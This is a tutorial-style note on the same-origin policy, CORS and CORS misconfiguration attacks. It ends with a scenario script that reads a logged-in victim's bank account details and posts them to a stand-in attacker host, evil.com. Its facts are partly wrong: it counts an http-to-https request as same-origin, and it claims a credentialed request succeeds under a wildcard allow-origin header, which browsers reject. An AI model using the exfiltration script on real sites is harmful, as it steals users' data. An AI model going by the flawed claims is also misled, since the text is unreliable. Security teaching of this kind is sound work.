## Preface
#### What is SOP ?
same origin policy is determined by browsers that disallows a web application reading data from another web application. The parameter of this functionality is that when a request is sent, the source need to have the same origin as destination. example :

* http://x.com --> https://x.com --------> DENY (different protocol)
* http://x.com --> https://x.com/login/ --------> OK 
* http://x.com --> https://x.com:8080 --------> DENY (different port)
##### What is origin ?
origin is defined by protocol, host name, and port of the URL.


## What is CORS ?
Cross-origin resource sharing is a mechanism that uses HTTP headers to define origins that the browser permit loading resources.
For example if `domain-a.com` wants to request `domain-b.com`, by default it's not gonna work, though by setting CORS rules we can let some specific domains to make requests.
To conclude these rules we can set HTTP header attributes, it can be for either letting basic requests or user credentials.


## CORS Vulnerabilities 

> In general if a vulnerable application uses ==cookies== to store authentication, and has an endpoint that returns sensitive information the following cases are vulnerable : 

* `access-control-allow-origin= *` : if it the value is `*` and the `access-control-allow-credentials=true`, you can run a script to request the vulnerable application from any origin and get credential data. To get the data of a user you must make him click on the link of your script which should be an available web page on the internet. to check if an application has this vulnerability, set `origin: [some origin]` and send the request, if it is reflected in the respond then it is vulnerable.

* `access-control-allow-origin= null` : To check if an application has this vulnerability you can place it in the header and set the value to null and if it is reflected in the respond it is vulnerable.  To pretend that your script's origin is null you can wrap the script in the `iframe` tag (a HTML tag).

* `access-control-allow-origin= [only the subdomains]`: Some applications only allow their own subdomain, to exploit this kind of vulnerability you can either find a vulnerability such as XSS in the subdomains of the vulnerable web application or you can put the permitted origin (in this context the url that contains other subdomains of the vulnerable app ) in your script (you can do it in `document.location`) and defraud the users to click on your script.

---

### CORS Exploitation Scenario


1. **Vulnerable API Configuration:**
   - The target website, `bank.com`, has an API endpoint at `api.bank.com` that allows authenticated users to access their account details.
   - The API is configured to allow CORS requests from any origin with the following header: 

```http
     Access-Control-Allow-Origin: *
```

2. **Victim's Browser:**
   - The victim is logged into `bank.com` and has an active session.

3. **Malicious Website:**
   - The attacker sets up a malicious website at `evil.com` with a script that makes a CORS request to the vulnerable API at `api.bank.com`.

4. **Attack Execution:**
   - The victim visits `evil.com`, which contains a hidden script that sends a request to `api.bank.com`.
   - Since the victim is already logged into `bank.com`, the browser automatically includes the session cookies in the request.

5. **CORS Request:**
   - The script on `evil.com` might look something like this:
     ```javascript
     fetch('https://api.bank.com/account/details', {
       method: 'GET',
       credentials: 'include' // Include cookies in the request
     })
     .then(response => response.json())
     .then(data => {
       // Send the data to the attacker's server
       fetch('https://evil.com/steal-data', {
         method: 'POST',
         body: JSON.stringify(data),
         headers: {
           'Content-Type': 'application/json'
         }
       });
     });
     ```

6. **Data Theft:**
   - The CORS request succeeds because the vulnerable API allows requests from any origin (`Access-Control-Allow-Origin: *`).
   - The API responds with the user's account details.
   - The malicious script sends these details to the attacker's server.

#### Key Points

1. **Vulnerable CORS Configuration:**
   - The API at `api.bank.com` has a weak CORS policy that allows any origin (`Access-Control-Allow-Origin: *`), making it susceptible to abuse.

2. **Exploiting Browser Behavior:**
   - The browser includes session cookies in the request to `api.bank.com` because the victim is logged in, and the `credentials: 'include'` option is used.

3. **Data Exfiltration:**
   - The attacker uses the data obtained from the API response and sends it to their own server for malicious use.
